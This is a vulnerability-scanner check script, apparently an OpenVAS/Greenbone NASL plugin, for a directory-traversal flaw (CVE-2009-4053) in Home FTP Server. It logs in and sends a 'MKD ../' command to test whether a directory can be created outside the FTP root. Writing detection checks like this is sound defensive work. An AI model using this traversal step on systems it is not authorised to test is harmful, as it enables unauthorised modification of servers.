if(description){
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/37041" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/507932" );
	script_oid( "1.3.6.1.4.1.25623.1.0.100349" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-11-18 12:44:57 +0100 (Wed, 18 Nov 2009)" );
	script_bugtraq_id( 37041 );
	script_cve_id( "CVE-2009-4053" );
	script_tag( name: "cvss_base", value: "4.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:N/I:P/A:N" );
	script_name( "Home FTP Server 'MKD' Command Directory Traversal Vulnerability" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "FTP" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/home_ftp/detected" );
	script_tag( name: "summary", value: "Home FTP Server is prone to a directory-traversal vulnerability
  because the application fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue allows an authenticated user to create
  directories outside the FTP root directory, which may lead to other attacks." );
	script_tag( name: "affected", value: "Home FTP Server 1.10.1.139 is vulnerable. Other versions may
  also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "Home Ftp Server" )){
	exit( 0 );
}
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc1, user: user, pass: pass );
if(login_details){
	vt_strings = get_vt_strings();
	dir = vt_strings["default_rand"];
	result = ftp_send_cmd( socket: soc1, cmd: NASLString( "MKD ../", dir ) );
	ftp_close( socket: soc1 );
	close( soc1 );
	if(result && ContainsString( result, "directory created" )){
		report = NASLString( "It was possible to create the directory ", dir, " outside the FTP root directory.\\n" );
		security_message( port: ftpPort, data: report );
		exit( 0 );
	}
}
exit( 0 );

